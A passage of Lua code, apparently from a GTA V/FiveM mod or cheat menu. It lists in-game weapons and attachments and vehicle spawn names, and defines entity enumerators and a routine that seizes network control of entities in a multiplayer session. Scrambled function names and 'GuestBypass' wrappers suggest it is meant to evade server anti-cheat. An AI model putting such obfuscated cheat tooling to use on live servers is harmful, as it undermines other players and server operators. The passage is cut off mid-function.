                    {name = "~s~~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "~s~~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "~s~~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        },
        GusenbergSweeper = {
            id = "weapon_gusenberg",
            name = "~s~~s~GusenbergSweeper",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_GUSENBERG_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_GUSENBERG_CLIP_02"}
                }
            }
        }
    },
    Snipers = {
        SniperRifle = {
            id = "weapon_sniperrifle",
            name = "~s~~s~Sniper Rifle",
            bInfAmmo = false,
            mods = {
                Sights = {
                    {name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_LARGE"},
                    {name = "~s~~s~Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"}
                },
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}}
            }
        },
        HeavySniper = {
            id = "weapon_heavysniper",
            name = "~s~~s~Heavy Sniper",
            bInfAmmo = false,
            mods = {
                Sights = {
                    {name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_LARGE"},
                    {name = "~s~~s~Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"}
                }
            }
        },
        HeavySniperMkII = {
            id = "weapon_heavysniper_mk2",
            name = "~s~~s~Heavy Sniper Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_02"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Armor Piercing Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ"},
                    {name = "~s~~s~Explosive Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE"}
                },
                Sights = {
                    {name = "~s~~s~Zoom Scope", id = "COMPONENT_AT_SCOPE_LARGE_MK2"},
                    {name = "~s~~s~Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"},
                    {name = "~s~~s~Nigt Vision Scope", id = "COMPONENT_AT_SCOPE_NV"},
                    {name = "~s~~s~Thermal Scope", id = "COMPONENT_AT_SCOPE_THERMAL"}
                },
                Barrel = {
                    {name = "~s~~s~Default", id = "COMPONENT_AT_SR_BARREL_01"},
                    {name = "~s~~s~Heavy", id = "COMPONENT_AT_SR_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_SR_SUPP_03"},
                    {name = "~s~~s~Squared Muzzle Brake", id = "COMPONENT_AT_MUZZLE_08"},
                    {name = "~s~~s~Bell-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_09"}
                }
            }
        },
        MarksmanRifle = {
            id = "weapon_marksmanrifle",
            name = "~s~~s~Marksman Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_MARKSMANRIFLE_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_MARKSMANRIFLE_CLIP_02"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        MarksmanRifleMkII = {
            id = "weapon_marksmanrifle_mk2",
            name = "~s~~s~Marksman Rifle Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_02"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "~s~~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"},
                    {name = "~s~~s~Zoom Scope", id = "COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "~s~~s~Default", id = "COMPONENT_AT_MRFL_BARREL_01"},
                    {name = "~s~~s~Heavy", id = "COMPONENT_AT_MRFL_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"},
                    {name = "~s~~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "~s~~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "~s~~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "~s~~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "~s~~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "~s~~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "~s~~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        }
    },
    Heavy = {
        RPG = {id = "weapon_rpg", name = "~s~~s~RPG", bInfAmmo = false, mods = {}},
        GrenadeLauncher = {id = "weapon_grenadelauncher", name = "~s~~s~Grenade Launcher", bInfAmmo = false, mods = {}},
        GrenadeLauncherSmoke = {
            id = "weapon_grenadelauncher_smoke",
            name = "~s~~s~Grenade Launcher Smoke",
            bInfAmmo = false,
            mods = {}
        },
        Minigun = {id = "weapon_minigun", name = "~s~~s~Minigun", bInfAmmo = false, mods = {}},
        FireworkLauncher = {id = "weapon_firework", name = "~s~~s~Firework Launcher", bInfAmmo = false, mods = {}},
        Railgun = {id = "weapon_railgun", name = "~s~~s~Railgun", bInfAmmo = false, mods = {}},
        HomingLauncher = {id = "weapon_hominglauncher", name = "~s~~s~Homing Launcher", bInfAmmo = false, mods = {}},
        CompactGrenadeLauncher = {
            id = "weapon_compactlauncher",
            name = "~s~~s~Compact Grenade Launcher",
            bInfAmmo = false,
            mods = {}
        },
        Widowmaker = {id = "weapon_rayminigun", name = "~s~~s~Widowmaker", bInfAmmo = false, mods = {}}
    },
    Throwables = {
        Grenade = {id = "weapon_grenade", name = "~s~~s~Grenade", bInfAmmo = false, mods = {}},
        BZGas = {id = "weapon_bzgas", name = "~s~~s~BZ Gas", bInfAmmo = false, mods = {}},
        MolotovCocktail = {id = "weapon_molotov", name = "~s~~s~Molotov Cocktail", bInfAmmo = false, mods = {}},
        StickyBomb = {id = "weapon_stickybomb", name = "~s~~s~Sticky Bomb", bInfAmmo = false, mods = {}},
        ProximityMines = {id = "weapon_proxmine", name = "~s~~s~Proximity Mines", bInfAmmo = false, mods = {}},
        Snowballs = {id = "weapon_snowball", name = "~s~~s~Snowballs", bInfAmmo = false, mods = {}},
        PipeBombs = {id = "weapon_pipebomb", name = "~s~~s~Pipe Bombs", bInfAmmo = false, mods = {}},
        Baseball = {id = "weapon_ball", name = "~s~~s~Baseball", bInfAmmo = false, mods = {}},
        TearGas = {id = "weapon_smokegrenade", name = "~s~~s~Tear Gas", bInfAmmo = false, mods = {}},
        Flare = {id = "weapon_flare", name = "~s~~s~Flare", bInfAmmo = false, mods = {}}
    },
    Misc = {
        Parachute = {id = "gadget_parachute", name = "~s~~s~Parachute", bInfAmmo = false, mods = {}},
        FireExtinguisher = {
            id = "weapon_fireextinguisher",
            name = "~s~~s~Fire Extinguisher",
            bInfAmmo = false,
            mods = {}
        }
    }
}
I.FunctionTables.weaponsModels = {
    "WEAPON_KNIFE",
    "WEAPON_KNUCKLE",
    "WEAPON_NIGHTSTICK",
    "WEAPON_HAMMER",
    "WEAPON_BAT",
    "WEAPON_GOLFCLUB",
    "WEAPON_CROWBAR",
    "WEAPON_BOTTLE",
    "WEAPON_DAGGER",
    "WEAPON_HATCHET",
    "WEAPON_MACHETE",
    "WEAPON_FLASHLIGHT",
    "WEAPON_SWITCHBLADE",
    "WEAPON_POOLCUE",
    "WEAPON_PIPEWRENCH",
    "WEAPON_PISTOL",
    "WEAPON_PISTOL_MK2",
    "WEAPON_COMBATPISTOL",
    "WEAPON_APPISTOL",
    "WEAPON_REVOLVER",
    "WEAPON_REVOLVER_MK2",
    "WEAPON_DOUBLEACTION",
    "WEAPON_PISTOL50",
    "WEAPON_SNSPISTOL",
    "WEAPON_SNSPISTOL_MK2",
    "WEAPON_HEAVYPISTOL",
    "WEAPON_VINTAGEPISTOL",
    "WEAPON_STUNGUN",
    "WEAPON_FLAREGUN",
    "WEAPON_MARKSMANPISTOL",
    "WEAPON_MICROSMG",
    "WEAPON_MINISMG",
    "WEAPON_SMG",
    "WEAPON_SMG_MK2",
    "WEAPON_ASSAULTSMG",
    "WEAPON_COMBATPDW",
    "WEAPON_GUSENBERG",
    "WEAPON_MACHINEPISTOL",
    "WEAPON_MG",
    "WEAPON_COMBATMG",
    "WEAPON_COMBATMG_MK2",
    "WEAPON_ASSAULTRIFLE",
    "WEAPON_ASSAULTRIFLE_MK2",
    "WEAPON_CARBINERIFLE",
    "WEAPON_CARBINERIFLE_MK2",
    "WEAPON_ADVANCEDRIFLE",
    "WEAPON_SPECIALCARBINE",
    "WEAPON_SPECIALCARBINE_MK2",
    "WEAPON_BULLPUPRIFLE",
    "WEAPON_BULLPUPRIFLE_MK2",
    "WEAPON_COMPACTRIFLE",
    "WEAPON_PUMPSHOTGUN",
    "WEAPON_PUMPSHOTGUN_MK2",
    "WEAPON_SWEEPERSHOTGUN",
    "WEAPON_SAWNOFFSHOTGUN",
    "WEAPON_BULLPUPSHOTGUN",
    "WEAPON_ASSAULTSHOTGUN",
    "WEAPON_MUSKET",
    "WEAPON_HEAVYSHOTGUN",
    "WEAPON_DBSHOTGUN",
    "WEAPON_SNIPERRIFLE",
    "WEAPON_HEAVYSNIPER",
    "WEAPON_HEAVYSNIPER_MK2",
    "WEAPON_MARKSMANRIFLE",
    "WEAPON_MARKSMANRIFLE_MK2",
    "WEAPON_GRENADELAUNCHER",
    "WEAPON_GRENADELAUNCHER_SMOKE",
    "WEAPON_RPG",
    "WEAPON_MINIGUN",
    "WEAPON_FIREWORK",
    "WEAPON_RAILGUN",
    "WEAPON_HOMINGLAUNCHER",
    "WEAPON_COMPACTLAUNCHER",
    "WEAPON_GRENADE",
    "WEAPON_STICKYBOMB",
    "WEAPON_PROXMINE",
    "WEAPON_BZGAS",
    "WEAPON_SMOKEGRENADE",
    "WEAPON_MOLOTOV",
    "WEAPON_FIREEXTINGUISHER",
    "WEAPON_PETROLCAN",
    "WEAPON_SNOWBALL",
    "WEAPON_FLARE",
    "WEAPON_BALL"
}
I.FunctionTables.vehicleCategories = {
    "Boats",
    "Commercial",
    "Compacts",
    "Coupes",
    "Cycles",
    "Emergency",
    "Helictopers",
    "Industrial",
    "Military",
    "Motorcycles",
    "Muscle",
    "Off-Road",
    "Planes",
    "SUVs",
    "Sedans",
    "Service",
    "Sports",
    "Sports Classic",
    "Super",
    "Trailer",
    "Trains",
    "Utility",
    "Vans"
}
I.FunctionTables.vehiclesAddonsList = {
    "2014rs5",
    "2016rs7",
    "aaq4",
    "q820",
    "r8v10",
    "rs4avant",
    "rs6black",
    "r820",
    "rs3",
    "rs318",
    "sq72016",
    "bentayga17",
    "contgt13",
    "bmci",
    "e60",
    "m3f80",
    "x6m",
    "c7",
    "16challenger",
    "16chager",
    "99viper",
    "95stang",
    "mustang19",
    "ap2",
    "civic",
    "tuscani",
    "lp670sv",
    "gs350",
    "lc500",
    "rx7tunable",
    "amggtr",
    "c63s",
    "cl65",
    "e63amg",
    "g65",
    "evo10",
    "mitsugto",
    "180sx",
    "370z",
    "gtr",
    "evoque",
    "subisti08",
    "subwrx",
    "avalon",
    "cam08",
    "celisupra",
    "gt86",
    "supra",
    "supra2",
    "a80",
    "r50",
    "rs6black"
}
I.FunctionTables.vehiclesBoatsList = {
    "Dinghy",
    "Dinghy2",
    "Dinghy3",
    "Dingh4",
    "Jetmax",
    "Marquis",
    "Seashark",
    "Seashark2",
    "Seashark3",
    "Speeder",
    "Speeder2",
    "Squalo",
    "Submersible",
    "Submersible2",
    "Suntrap",
    "Toro",
    "Toro2",
    "Tropic",
    "Tropic2",
    "Tug"
}
I.FunctionTables.vehiclesTruckList = {
    "Benson",
    "Biff",
    "Cerberus",
    "Cerberus2",
    "Cerberus3",
    "Hauler",
    "Hauler2",
    "Mule",
    "Mule2",
    "Mule3",
    "Mule4",
    "Packer",
    "Phantom",
    "Phantom2",
    "Phantom3",
    "Pounder",
    "Pounder2",
    "Stockade",
    "Stockade3",
    "Terbyte"
}
I.FunctionTables.vehiclesCompactsList = {
    "Blista",
    "Blista2",
    "Blista3",
    "Brioso",
    "Dilettante",
    "Dilettante2",
    "Issi2",
    "Issi3",
    "issi4",
    "Iss5",
    "issi6",
    "Panto",
    "Prarire",
    "Rhapsody"
}
I.FunctionTables.vehiclesCoupesList = {
    "CogCabrio",
    "Exemplar",
    "F620",
    "Felon",
    "Felon2",
    "Jackal",
    "Oracle",
    "Oracle2",
    "Sentinel",
    "Sentinel2",
    "Windsor",
    "Windsor2",
    "Zion",
    "Zion2"
}
I.FunctionTables.vehiclesBicyclesList = {"Bmx", "Cruiser", "Fixter", "Scorcher", "Tribike", "Tribike2", "tribike3"}
I.FunctionTables.vehiclesEmergencyList = {
    "ambulance",
    "FBI",
    "FBI2",
    "FireTruk",
    "PBus",
    "police",
    "Police2",
    "Police3",
    "Police4",
    "PoliceOld1",
    "PoliceOld2",
    "PoliceT",
    "Policeb",
    "Polmav",
    "Pranger",
    "Predator",
    "Riot",
    "Riot2",
    "Sheriff",
    "Sheriff2"
}
I.FunctionTables.vehiclesHelicoptersList = {
    "Akula",
    "Annihilator",
    "Buzzard",
    "Buzzard2",
    "Cargobob",
    "Cargobob2",
    "Cargobob3",
    "Cargobob4",
    "Frogger",
    "Frogger2",
    "Havok",
    "Hunter",
    "Maverick",
    "Savage",
    "Seasparrow",
    "Skylift",
    "Supervolito",
    "Supervolito2",
    "Swift",
    "Swift2",
    "Valkyrie",
    "Valkyrie2",
    "Volatus"
}
I.FunctionTables.vehiclesIndustrialsList = {
    "Bulldozer",
    "Cutter",
    "Dump",
    "Flatbed",
    "Guardian",
    "Handler",
    "Mixer",
    "Mixer2",
    "Rubble",
    "Tiptruck",
    "Tiptruck2"
}
I.FunctionTables.vehiclesMilitaryVehicles = {
    "APC",
    "Barracks",
    "Barracks2",
    "Barracks3",
    "Barrage",
    "Chernobog",
    "Crusader",
    "Halftrack",
    "Khanjali",
    "Rhino",
    "Scarab",
    "Scarab2",
    "Scarab3",
    "Thruster",
    "Trailersmall2"
}
I.FunctionTables.vehiclesMotorcyclesList = {
    "Akuma",
    "Avarus",
    "Bagger",
    "Bati2",
    "Bati",
    "BF400",
    "Blazer4",
    "CarbonRS",
    "Chimera",
    "Cliffhanger",
    "Daemon",
    "Daemon2",
    "Defiler",
    "Deathbike",
    "Deathbike2",
    "Deathbike3",
    "Diablous",
    "Diablous2",
    "Double",
    "Enduro",
    "esskey",
    "Faggio2",
    "Faggio3",
    "Faggio",
    "Fcr2",
    "fcr",
    "gargoyle",
    "hakuchou2",
    "hakuchou",
    "hexer",
    "innovation",
    "Lectro",
    "Manchez",
    "Nemesis",
    "Nightblade",
    "Oppressor",
    "Oppressor2",
    "PCJ",
    "Ratbike",
    "Ruffian",
    "Sanchez2",
    "Sanchez",
    "Sanctus",
    "Shotaro",
    "Sovereign",
    "Thrust",
    "Vader",
    "Vindicator",
    "Vortex",
    "Wolfsbane",
    "zombiea",
    "zombieb"
}
I.FunctionTables.vehiclesMuscleList = {
    "Blade",
    "Buccaneer",
    "Buccaneer2",
    "Chino",
    "Chino2",
    "clique",
    "Deviant",
    "Dominator",
    "Dominator2",
    "Dominator3",
    "Dominator4",
    "Dominator5",
    "Dominator6",
    "Dukes",
    "Dukes2",
    "Ellie",
    "Faction",
    "faction2",
    "faction3",
    "Gauntlet",
    "Gauntlet2",
    "Hermes",
    "Hotknife",
    "Hustler",
    "Impaler",
    "Impaler2",
    "Impaler3",
    "Impaler4",
    "Imperator",
    "Imperator2",
    "Imperator3",
    "Lurcher",
    "Moonbeam",
    "Moonbeam2",
    "Nightshade",
    "Phoenix",
    "Picador",
    "RatLoader",
    "RatLoader2",
    "Ruiner",
    "Ruiner2",
    "Ruiner3",
    "SabreGT",
    "SabreGT2",
    "Sadler2",
    "Slamvan",
    "Slamvan2",
    "Slamvan3",
    "Slamvan4",
    "Slamvan5",
    "Slamvan6",
    "Stalion",
    "Stalion2",
    "Tampa",
    "Tampa3",
    "Tulip",
    "Vamos,",
    "Vigero",
    "Virgo",
    "Virgo2",
    "Virgo3",
    "Voodoo",
    "Voodoo2",
    "Yosemite"
}
I.FunctionTables.vehiclesOffroadList = {
    "BFinjection",
    "Bifta",
    "Blazer",
    "Blazer2",
    "Blazer3",
    "Blazer5",
    "Bohdi",
    "Brawler",
    "Bruiser",
    "Bruiser2",
    "Bruiser3",
    "Caracara",
    "DLoader",
    "Dune",
    "Dune2",
    "Dune3",
    "Dune4",
    "Dune5",
    "Insurgent",
    "Insurgent2",
    "Insurgent3",
    "Kalahari",
    "Kamacho",
    "LGuard",
    "Marshall",
    "Mesa",
    "Mesa2",
    "Mesa3",
    "Monster",
    "Monster4",
    "Monster5",
    "Nightshark",
    "RancherXL",
    "RancherXL2",
    "Rebel",
    "Rebel2",
    "RCBandito",
    "Riata",
    "Sandking",
    "Sandking2",
    "Technical",
    "Technical2",
    "Technical3",
    "TrophyTruck",
    "TrophyTruck2",
    "Freecrawler",
    "Menacer"
}
I.FunctionTables.vehiclesPlanesList = {
    "AlphaZ1",
    "Avenger",
    "Avenger2",
    "Besra",
    "Blimp",
    "blimp2",
    "Blimp3",
    "Bombushka",
    "Cargoplane",
    "Cuban800",
    "Dodo",
    "Duster",
    "Howard",
    "Hydra",
    "Jet",
    "Lazer",
    "Luxor",
    "Luxor2",
    "Mammatus",
    "Microlight",
    "Miljet",
    "Mogul",
    "Molotok",
    "Nimbus",
    "Nokota",
    "Pyro",
    "Rogue",
    "Seabreeze",
    "Shamal",
    "Starling",
    "Stunt",
    "Titan",
    "Tula",
    "Velum",
    "Velum2",
    "Vestra",
    "Volatol",
    "Striekforce"
}
I.FunctionTables.vehiclesSuvsList = {
    "BJXL",
    "Baller",
    "Baller2",
    "Baller3",
    "Baller4",
    "Baller5",
    "Baller6",
    "Cavalcade",
    "Cavalcade2",
    "Dubsta",
    "Dubsta2",
    "Dubsta3",
    "FQ2",
    "Granger",
    "Gresley",
    "Habanero",
    "Huntley",
    "Landstalker",
    "patriot",
    "Patriot2",
    "Radi",
    "Rocoto",
    "Seminole",
    "Serrano",
    "Toros",
    "XLS",
    "XLS2"
}
I.FunctionTables.vehiclesSedansList = {
    "Asea",
    "Asea2",
    "Asterope",
    "Cog55",
    "Cogg552",
    "Cognoscenti",
    "Cognoscenti2",
    "emperor",
    "emperor2",
    "emperor3",
    "Fugitive",
    "Glendale",
    "ingot",
    "intruder",
    "limo2",
    "premier",
    "primo",
    "primo2",
    "regina",
    "romero",
    "stafford",
    "Stanier",
    "stratum",
    "stretch",
    "surge",
    "tailgater",
    "warrener",
    "Washington"
}
I.FunctionTables.vehiclesServicesList = {
    "Airbus",
    "Brickade",
    "Bus",
    "Coach",
    "Rallytruck",
    "Rentalbus",
    "taxi",
    "Tourbus",
    "Trash",
    "Trash2",
    "WastIndr",
    "PBus2"
}
I.FunctionTables.vehiclesSportsList = {
    "Alpha",
    "Banshee",
    "Banshee2",
    "BestiaGTS",
    "Buffalo",
    "Buffalo2",
    "Buffalo3",
    "Carbonizzare",
    "Comet2",
    "Comet3",
    "Comet4",
    "Comet5",
    "Coquette",
    "Deveste",
    "Elegy2",
    "Feltzer2",
    "Feltzer3",
    "FlashGT",
    "Furoregt",
    "Fusilade",
    "Futo",
    "GB200",
    "Hotring",
    "Infernus2",
    "Italigto",
    "Jester",
    "Jester2",
    "Khamelion",
    "Kurama",
    "Kurama2",
    "Lynx",
    "MAssacro",
    "MAssacro2",
    "neon",
    "Ninef",
    "ninfe2",
    "omnis",
    "Pariah",
    "Penumbra",
    "Raiden",
    "RapidGT",
    "RapidGT2",
    "Raptor",
    "Revolter",
    "Ruston",
    "Schafter2",
    "Schafter3",
    "Schafter4",
    "Schafter5",
    "Schafter6",
    "Schlagen",
    "Schwarzer",
    "Sentinel3",
    "Seven70",
    "Specter",
    "Specter2",
    "Streiter",
    "Sultan",
    "Surano",
    "Tampa2",
    "Tropos",
    "Verlierer2",
    "ZR380"
}
I.FunctionTables.vehiclesSportsClassicsList = {
    "Ardent",
    "BType",
    "BType2",
    "BType3",
    "Casco",
    "Cheetah2",
    "Cheburek",
    "Coquette2",
    "Coquette3",
    "Deluxo",
    "Fagaloa",
    "Gt500",
    "JB700",
    "Jester3",
    "MAmba",
    "Manana",
    "Michelli",
    "Monroe",
    "Peyote",
    "Pigalle",
    "RapidGT3",
    "Retinue",
    "Savestra",
    "Stinger",
    "Stingergt",
    "Stromberg",
    "Swinger",
    "Torero",
    "Tornado",
    "Tornado2",
    "Tornado3",
    "Tornado4",
    "Tornado5",
    "Tornado6",
    "Viseris",
    "Z190",
    "ZType"
}
I.FunctionTables.vehiclesSupersList = {
    "Adder",
    "Autarch",
    "Bullet",
    "Cheetah",
    "Cyclone",
    "Elegy",
    "EntityXF",
    "Entity2",
    "FMJ",
    "GP1",
    "Infernus",
    "LE7B",
    "Nero",
    "Nero2",
    "Osiris",
    "Penetrator",
    "PFister811",
    "Prototipo",
    "Reaper",
    "SC1",
    "Scramjet",
    "Sheava",
    "SultanRS",
    "Superd",
    "T20",
    "Taipan",
    "Tempesta",
    "Tezeract",
    "Turismo2",
    "Turismor",
    "Tyrant",
    "Tyrus",
    "Vacca",
    "Vagner",
    "Vigilante",
    "Visione",
    "Voltic",
    "Voltic2",
    "Zentorno",
    "Italigtb",
    "Italigtb2",
    "XA21"
}
I.FunctionTables.vehiclesTrailersList = {
    "ArmyTanker",
    "ArmyTrailer",
    "ArmyTrailer2",
    "BaleTrailer",
    "BoatTrailer",
    "CableCar",
    "DockTrailer",
    "Graintrailer",
    "Proptrailer",
    "Raketailer",
    "TR2",
    "TR3",
    "TR4",
    "TRFlat",
    "TVTrailer",
    "Tanker",
    "Tanker2",
    "Trailerlogs",
    "Trailersmall",
    "Trailers",
    "Trailers2",
    "Trailers3"
}
I.FunctionTables.vehiclesTrainsList = {
    "Freight",
    "Freightcar",
    "Freightcont1",
    "Freightcont2",
    "Freightgrain",
    "Freighttrailer",
    "TankerCar"
}
I.FunctionTables.vehiclesWorkList = {
    "Airtug",
    "Caddy",
    "Caddy2",
    "Caddy3",
    "Docktug",
    "Forklift",
    "Mower",
    "Ripley",
    "Sadler",
    "Scrap",
    "TowTruck",
    "Towtruck2",
    "Tractor",
    "Tractor2",
    "Tractor3",
    "TrailerLArge2",
    "Utilitruck",
    "Utilitruck3",
    "Utilitruck2"
}
I.FunctionTables.vehiclesVansList = {
    "Bison",
    "Bison2",
    "Bison3",
    "BobcatXL",
    "Boxville",
    "Boxville2",
    "Boxville3",
    "Boxville4",
    "Boxville5",
    "Burrito",
    "Burrito2",
    "Burrito3",
    "Burrito4",
    "Burrito5",
    "Camper",
    "GBurrito",
    "GBurrito2",
    "Journey",
    "Minivan",
    "Minivan2",
    "Paradise",
    "pony",
    "Pony2",
    "Rumpo",
    "Rumpo2",
    "Rumpo3",
    "Speedo",
    "Speedo2",
    "Speedo4",
    "Surfer",
    "Surfer2",
    "Taco",
    "Youga",
    "youga2"
}
I.FunctionTables.fullVehiclesList = {
    I.FunctionTables.vehiclesBoatsList,
    I.FunctionTables.vehiclesTruckList,
    I.FunctionTables.vehiclesCompactsList,
    I.FunctionTables.vehiclesCoupesList,
    I.FunctionTables.vehiclesBicyclesList,
    I.FunctionTables.vehiclesEmergencyList,
    I.FunctionTables.vehiclesHelicoptersList,
    I.FunctionTables.vehiclesIndustrialsList,
    I.FunctionTables.vehiclesMilitaryVehicles,
    I.FunctionTables.vehiclesMotorcyclesList,
    I.FunctionTables.vehiclesMuscleList,
    I.FunctionTables.vehiclesOffroadList,
    I.FunctionTables.vehiclesPlanesList,
    I.FunctionTables.vehiclesSuvsList,
    I.FunctionTables.vehiclesSedansList,
    I.FunctionTables.vehiclesServicesList,
    I.FunctionTables.vehiclesSportsList,
    I.FunctionTables.vehiclesSportsClassicsList,
    I.FunctionTables.vehiclesSupersList,
    I.FunctionTables.vehiclesTrailersList,
    I.FunctionTables.vehiclesTrainsList,
    I.FunctionTables.vehiclesWorkList,
    I.FunctionTables.vehiclesVansList
}
local b8 = {}
do
    function b8.GuestInsert(b9, h, i)
        if not rawget(b9._values, h) then
            b9._keys[#b9._keys + 1] = h
        end
        if i == nil then
            b8.GuestRemove(b9, h)
        else
            b9._values[h] = i
        end
    end
    local function ba(b9, bb)
        for b7, i in ipairs(b9) do
            if i == bb then
                return b7
            end
        end
    end
    function b8.GuestRemove(b9, h)
        local i = b9._values[h]
        if i ~= nil then
            GuestBypassMainGuestTable.GuestRemove(
                b9._keys,
                ba(b9._keys, h)
            )
            b9._values[h] = nil
        end
        return i
    end
    function b8.index(b9, h)
        return rawget(b9._values, h)
    end
    function b8.pairs(b9)
        local b7 = 0
        return function()
            b7 = b7 + 1
            local aM = b9._keys[b7]
            if aM ~= nil then
                return aM, b9._values[aM]
            end
        end
    end
    function b8.new(bc)
        bc = bc or {}
        local b9 = {_keys = {}, _values = {}}
        local bd = #bc
        if bd % 2 ~= 0 then
            error "in oGuestBypassMainGuestTable initialization: key is missing value"
        end
        for b7 = 1, bd / 2 do
            local h = bc[b7 * 2 - 1]
            local i = bc[b7 * 2]
            if b9._values[h] ~= nil then
                error("duplicate key:" .. h)
            end
            b9._keys[#b9._keys + 1] = h
            b9._values[h] = i
        end
        return d.Main.GuestCoroutine.GuestMetatable(
            b9,
            {__newindex = b8.GuestInsert, __len = function(b9)
                    return #b9._keys
                end, __pairs = b8.pairs, __index = b9._values}
        )
    end
end
local be = {__gc = function(bf)
        if bf.destructor and bf.handle then
            bf.destructor(bf.handle)
        end
        bf.destructor = nil
        bf.handle = nil
    end}
I.NewFunction.dsgbfysdsfazazeaztg = function(bg, bh, bi)
    return d.Main.GuestCoroutine.GustWrap(
        function()
            local bj, aW = bg()
            if not aW or aW == 0 then
                bi(bj)
                return
            end
            local bf = {handle = bj, destructor = bi}
            d.Main.GuestCoroutine.GuestMetatable(
                bf,
                be
            )
            local bk = true
            repeat
                d.Main.GuestCoroutine.GuestYield(
                    aW
                )
                bk, aW = bh(bj)
            until not bk
            bf.destructor, bf.handle = nil, nil
            bi(bj)
        end
    )
end
I.NewFunction.dfgkdfoigkdojdfaaze = function()
    return I.NewFunction.dsgbfysdsfazazeaztg(FindFirstObject, FindNextObject, EndFindObject)
end
I.NewFunction.dfjofdnsfsdfsdfdsyu = function()
    return I.NewFunction.dsgbfysdsfazazeaztg(FindFirstPed, FindNextPed, EndFindPed)
end
I.NewFunction.sdkfhdshfbdsfhbsaaae = function()
    return I.NewFunction.dsgbfysdsfazazeaztg(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end
I.NewFunction.ghdsgohsufgqhfqqzdf = function()
    return I.NewFunction.dsgbfysdsfazazeaztg(FindFirstPickup, FindNextPickup, EndFindPickup)
end
I.NewFunction.fhdfsqodjfgsh = function(entity)
    if not NetworkIsInSession() or NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end
I.NewFunction.lpdfiodsjqshudvazaerz = function(bl)
    local bm =
        d.Main.GuestMath.GuestRad(bl.z)
    local bn =
        d.Main.GuestMath.GuestRad(bl.x)
    local bo =
        d.Main.GuestMath.GuestAbs(
        d.Main.GuestMath.GuestCos(bn)
    )
    return vector3(
        -d.Main.GuestMath.GuestSin(bm) *
            bo,
        d.Main.GuestMath.GuestCos(bm) *
            bo,
        d.Main.GuestMath.GuestSin(bn)
    )
end
I.NewFunction.sdfjdijsfhdsfhdsfq = function(bp)
    local bq = GetGameplayCamRot(2)
    local br = GetGameplayCamCoord()
    local bs = 0.0
    local bt = 0.0
    local bu = 0.0
